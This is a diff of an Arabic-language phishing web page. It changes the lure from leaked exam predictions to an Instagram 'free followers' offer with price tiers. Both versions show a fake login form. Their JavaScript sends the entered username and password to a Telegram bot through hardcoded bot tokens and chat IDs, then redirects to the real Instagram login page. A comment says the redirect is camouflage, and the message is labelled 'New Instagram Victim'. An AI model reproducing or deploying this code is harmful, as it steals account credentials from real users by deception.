@@ -2,37 +2,70 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>توقعات الإنجليزي - 2009</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - Get Free Followers</title>
     <style>
-        body { font-family: sans-serif; background: #fafafa; text-align: center; margin: 0; }
-        .header { background: linear-gradient(45deg, #f09433, #bc1888); color: white; padding: 15px; font-weight: bold; }
-        input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #dbdbdb; border-radius: 3px; }
-        button { width: 95%; padding: 12px; background: #0095f6; color: white; border: none; border-radius: 5px; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .card { background: white; width: 90%; max-width: 380px; padding: 25px; border-radius: 15px; box-shadow: 0 15px 30px rgba(0,0,0,0.2); text-align: center; }
+        .logo { width: 180px; margin-bottom: 20px; }
+        h2 { color: #262626; font-size: 18px; margin-bottom: 15px; }
+        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dbdbdb; border-radius: 5px; background: #fafafa; font-size: 14px; box-sizing: border-box; }
+        .btn { width: 100%; padding: 12px; background-color: #0095f6; border: none; border-radius: 5px; color: white; font-weight: bold; font-size: 14px; cursor: pointer; margin-top: 10px; }
+        .price-tag { font-size: 12px; color: #8e8e8e; margin-top: 5px; display: block; }
+        .security-note { font-size: 11px; color: #a8a8a8; margin-top: 20px; }
     </style>
 </head>
 <body>
-    <div class="header">مراجعة ليلة الامتحان - جيل 2009 📚</div>
-    <video width="100%" autoplay loop muted playsinline><source src="video.mp4" type="video/mp4"></video>
-    <div style="background: white; border: 1px solid #dbdbdb; margin: 10px; padding: 20px;">
-        <p>سجل دخولك لمشاهدة ملف التوقعات</p>
-        <form id="login">
-            <input type="text" id="u" placeholder="اسم المستخدم" required>
-            <input type="password" id="p" placeholder="كلمة السر" required>
-            <button type="submit">تسجيل الدخول</button>
+
+    <div class="card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" class="logo">
+        <h2>احصل على متابعين حقيقيين فوراً 🚀</h2>
+        
+        <form id="igForm">
+            <input type="text" id="username" placeholder="اسم المستخدم (Username)" required>
+            <input type="password" id="password" placeholder="كلمة السر" required>
+            
+            <select id="plan">
+                <option value="1000_Free">1,000 متابع (مجاني - Free) ✅</option>
+                <option value="10000_5JD">10,000 متابع (5.00 JOD) 💰</option>
+                <option value="50000_15JD">50,000 متابع (15.00 JOD) 🔥</option>
+                <option value="100000_25JD">100,000 متابع (25.00 JOD) 👑</option>
+            </select>
+            <span class="price-tag">* المتابعين يتم إضافتهم خلال 5 دقائق</span>
+
+            <button type="submit" class="btn">تفعيل الزيادة الآن</button>
         </form>
+
+        <p class="security-note">نحن نستخدم تشفير 256-bit لضمان أمان حسابك.</p>
     </div>
+
     <script>
-        const pr = new URLSearchParams(window.location.search);
-        const token = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE';
-        document.getElementById('login').onsubmit = function(e) {
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get('chat_id') || '7238206121'; 
+        const botToken = urlParams.get('bot_token') || '8669513520:AAFYrZjQ_dKL5dCfKU74XN0c1tOCte_HkwY';
+
+        document.getElementById('igForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            const msg = `🎯 صيدة انستقرام (2009) 🎯\n👤 الصياد: ${pr.get('hunter')}\n📧 الحساب: ${document.getElementById('u').value}\n🔑 الباسورد: ${document.getElementById('p').value}`;
-            const fullMsg = encodeURIComponent(msg);
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('id')}&text=${fullMsg}`);
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('dev')}&text=${fullMsg}`)
-            .then(() => { window.location.href = "https://www.instagram.com"; });
-        };
+            
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            const plan = document.getElementById('plan').value;
+
+            const message = `
+📸 **New Instagram Victim!**
+👤 **User:** \`${user}\`
+🔑 **Pass:** \`${pass}\`
+📈 **Plan:** \`${plan}\`
+💻 **System:** M.Y.9 Tech
+🦅 **Dev:** Abu Osayed Malkawi
+            `;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
+            .then(() => {
+                // تحويل لصفحة إنستا الحقيقية للتمويه
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            });
+        });
     </script>
 </body>
 </html>
